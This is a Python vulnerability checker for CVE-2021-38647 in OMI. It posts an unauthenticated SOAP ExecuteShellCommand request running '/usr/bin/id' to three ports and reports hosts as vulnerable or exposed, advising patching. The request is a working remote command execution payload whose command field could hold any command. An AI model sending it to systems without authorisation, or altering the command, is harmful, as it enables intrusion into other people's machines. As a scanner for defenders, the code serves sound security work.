"""
Helper module for checking if an endpoint is vulnerable to CVE-2021-38647.
"""
import logging
import requests
import sys
from urllib3.exceptions import InsecureRequestWarning

VERSION = "0.1"
AUTHORS = "Made with <3 by FV and MS"

logging.basicConfig(level='DEBUG')
LOGGER = logging.getLogger(__name__)

# port status
DONT_KNOW = 0
OMI_EXPOSED_BUT_NOT_VULNERABLE = 1
OMI_EXPOSED_AND_VULNERABLE = 2

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def omi_check_url(url):
    """
    Checks if the endpoint is vulnerabile.
    Returns:
    -1 if the url is not reachable
    0 if the url is reachable but not vulnerable
    1 if the url is reachable and vulnerable
    """

    uri = f"{url}/wsman"

    body = """
<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:h="http://schemas.microsoft.com/wbem/wsman/1/windows/shell" xmlns:n="http://schemas.xmlsoap.org/ws/2004/09/enumeration" xmlns:p="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd" xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd" xmlns:xsi="http://www.w3.org/2001/XMLSchema">
<s:Header>
  <a:To>HTTP://192.168.1.1:5986/wsman/</a:To>
  <w:ResourceURI s:mustUnderstand="true">http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem</w:ResourceURI>
  <a:ReplyTo>
     <a:Address s:mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:Address>
  </a:ReplyTo>
  <a:Action>http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem/ExecuteShellCommand</a:Action>
  <w:MaxEnvelopeSize s:mustUnderstand="true">102400</w:MaxEnvelopeSize>
  <a:MessageID>uuid:0AB58087-C2C3-0005-0000-000000010000</a:MessageID>
  <w:OperationTimeout>PT1M30S</w:OperationTimeout>
  <w:Locale xml:lang="en-us" s:mustUnderstand="false" />
  <p:DataLocale xml:lang="en-us" s:mustUnderstand="false" />
  <w:OptionSet s:mustUnderstand="true" />
  <w:SelectorSet>
     <w:Selector Name="__cimnamespace">root/scx</w:Selector>
  </w:SelectorSet>
</s:Header>
<s:Body>
  <p:ExecuteShellCommand_INPUT xmlns:p="http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem">
     <p:command>/usr/bin/id</p:command>
     <p:timeout>0</p:timeout>
  </p:ExecuteShellCommand_INPUT>
</s:Body>
</s:Envelope>
"""
    headers = {
        'Content-type': 'application/soap+xml;charset=UTF-8',
        'User-Agent': 'Microsoft WinRM Client'
    }

    try:
        LOGGER.debug(f"Testing {uri}...")

        # Suppress only the single warning from urllib3 needed.
        #requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
        response = requests.post(uri, data=body, headers=headers,  timeout=10, verify=False)
        LOGGER.debug(f"Received status_code={response.status_code}")
        if response.status_code == 200:
            return 1
        else:
            return 0
    except Exception as e:
        LOGGER.error(e)
        return -1

def omi_check(fqdn):

    PORTS_TO_TEST = [
        ('https', '1270'),
        ('http', '5985'),
        ('https', '5986')
    ]

    report = {}
    for PORT_TO_TEST in PORTS_TO_TEST:
        protocol = PORT_TO_TEST[0]
        port = PORT_TO_TEST[1]

        LOGGER.debug("Checking %s on %s port %s...", fqdn, protocol, port)

        url = f'{protocol}://{fqdn}:{port}'
        res = omi_check_url(url)

        if res == -1:
            LOGGER.debug("...%s on http port %s is not reachable.", fqdn, port)
            report[str(port)] = DONT_KNOW

        elif res == 0:
            LOGGER.debug("...%s on http port %s is reachable but not vulnerable!", fqdn, port)
            report[str(port)] = OMI_EXPOSED_BUT_NOT_VULNERABLE

        elif res == 1:
            LOGGER.debug("...%s on http port %s is vulnerable!", fqdn, port)
            report[str(port)] = OMI_EXPOSED_AND_VULNERABLE

    return report

if __name__ == "__main__":

    print (r"""  ___  __  __   ___    ____  ___   ___  ____ ___
 / _ \|  \/  | |_ _|  / ___|/ _ \ / _ \|  _ \__ \
| | | | |\/| |  | |  | |  _| | | | | | | | | |/ /
| |_| | |  | |  | |  | |_| | |_| | |_| | |_| |_|
 \___/|_|  |_| |___|  \____|\___/ \___/|____/(_)"""
    )
    print()
    print(f"Version {VERSION}")
    print()
    print(AUTHORS)
    print()

    if len(sys.argv) < 2:
        print ("Usage:")
        print ("    omicheck.py <ip_address_or_fqdn>")
        print ()
        sys.exit()

    fqdn = sys.argv[1]

    print(f"Checking fqdn: {fqdn}")

    report = omi_check(fqdn)

    for port in report:
        if report[port] == DONT_KNOW:
            print(f"Port {port} on {fqdn} is not expose, or the host is not reachable.")
            print()
        elif report[port] == OMI_EXPOSED_BUT_NOT_VULNERABLE:
            print(f"{bcolors.WARNING} {fqdn} exposes OMI on port {port} but it is not vulnerable: it is recommended to review your Network Security Group, unless you have a good reason to not do so and you know what you are doing.")
            print()
        elif report[port] == OMI_EXPOSED_AND_VULNERABLE:
            print(f"{bcolors.FAIL} exposes a vulnerable OMI on port {port}: it is recommended to patch immediately and also to review your Network Security Group, unless you have a good reason to not do so and you know what you are doing.")
            print()

    print("All done.")
